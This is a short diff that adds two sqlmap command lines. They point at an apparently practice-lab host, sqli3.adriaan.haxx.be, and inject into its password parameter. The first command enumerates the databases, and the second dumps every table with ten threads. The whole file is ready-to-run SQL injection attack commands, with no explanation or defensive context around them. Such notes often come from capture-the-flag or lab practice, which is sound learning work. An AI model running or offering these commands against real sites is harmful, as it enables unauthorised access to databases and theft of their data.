@@ -1,0 +1,3 @@
+sqlmap -u "http://sqli3.adriaan.haxx.be/?username=test&password=mlqsdkjfqmlskdfj" --level 3 --risk 5 -D sqli3 -p password --dbs
+sqlmap -u "http://sqli3.adriaan.haxx.be/?username=test&password=mlqsdkjfqmlskdfj" --level 3 --risk 5 -D sqli3 -p password --dump-all --threads=10
+
